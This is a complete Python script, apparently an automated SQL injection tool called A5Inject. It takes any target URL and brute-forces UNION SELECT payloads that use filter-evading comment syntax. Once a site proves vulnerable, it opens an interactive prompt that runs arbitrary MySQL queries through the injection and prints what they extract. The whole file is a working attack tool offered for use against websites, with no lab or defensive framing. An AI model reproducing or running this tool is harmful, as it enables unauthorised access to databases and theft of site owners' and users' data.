#!/usr/bin/python
import re, sys, requests
print """
###############################################
# A5Inject - Auto SQL Injection               #
# Copyright (c)2019 - Afrizal F.A - ICWR-TECH #
###############################################
"""
target=sys.argv[1]
usr_a="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0"
print "[*] Start Inject URL : " + target.replace("[*]", "")
i="1111111111"
for x in range(0, 50) :
    query_union="/*!12345UniOn*/SeleCt/**/" + str(i) + "-- '"
    print "[*] Trying Payload : " + target.replace("[*]", query_union)
    get_union=requests.get(url=target.replace("[*]", query_union), headers={ "User-Agent" : usr_a }).content
    if re.search("1111111111", get_union) :
        result_url=target.replace("[*]", query_union)
        print "[+] This Site Is Vulnerability"
        while True:
            query=raw_input("[*] mysql@target => ")
            if query == "exit" :
                exit()
            remote_url=result_url.replace("1111111111", "(concat(0x3c63727573743e," + query + ",0x3c2f63727573743e ))")
            remote=requests.get(url=remote_url, headers={ "User-Agent" : usr_a }).content
            result=re.findall("""<crust>(.+?)</crust>""", remote)
            if result :
                print "[+] Output : " + result[0]
            else :
                print "[-] Query Not Executed"
    i+=",1111111111"
